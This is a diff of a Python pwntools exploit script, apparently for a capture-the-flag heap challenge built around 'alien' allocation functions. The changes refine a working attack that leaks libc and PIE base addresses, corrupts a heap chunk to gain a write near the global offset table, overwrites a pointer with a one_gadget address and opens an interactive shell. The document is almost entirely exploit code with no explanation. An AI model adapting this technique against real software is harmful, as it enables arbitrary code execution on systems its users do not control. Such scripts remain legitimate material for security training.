@@ -74,7 +74,7 @@ def main():
 
     libc_leak = rename_alien(6, "")
     libc.address = libc_leak - 0x3c4b78
-    one_gadget = libc.address + 0x45216 #0x4526a ; 0xf02a4 ; 0xf1147
+    one_gadget = libc.address + 0x45216
     log.info("libc_leak: {}".format(hex(libc_leak)))
     log.info("libc base address: {}".format(hex(libc.address)))
 
@@ -82,18 +82,21 @@ def main():
     exe.address = pie_leak - 0x202070
     log.info("pie_leak: {}".format(hex(pie_leak)))
     log.info("elf base address: {}".format(hex(exe.address)))
-    log.info("free@got: {}".format(hex(exe.got['free'])))
+    log.info("frees@got: {}".format(hex(exe.got['free'])))
 
+    target = exe.address + 0x20208d
+    ptr = exe.address + 0x20208d + 0x13
     r.send("\n")
     new_alien(0x60, "B"*0x60) # 8
     consume_alien(6)
-    rename_alien(8, p64(exe.got['free'] - 0x13))
+    rename_alien(8, p64(target))
 
-    #new_alien(0x60, "S"*0x60) # 9
-    #new_alien(0x60, "\x00"*0x3 + p64(one_gadget) + "\x00"*(0x60-0x3-0x8)) # 10
+    new_alien(0x60, "S"*0x60) # 9
+    new_alien(0x60, "A"*3 + p64(exe.got['puts']) + p64(ptr)) # 10
     
+    rename_alien(-3, p64(one_gadget))
 
-    gdb.attach(r)
+    #gdb.attach(r)
     r.interactive()
 
 
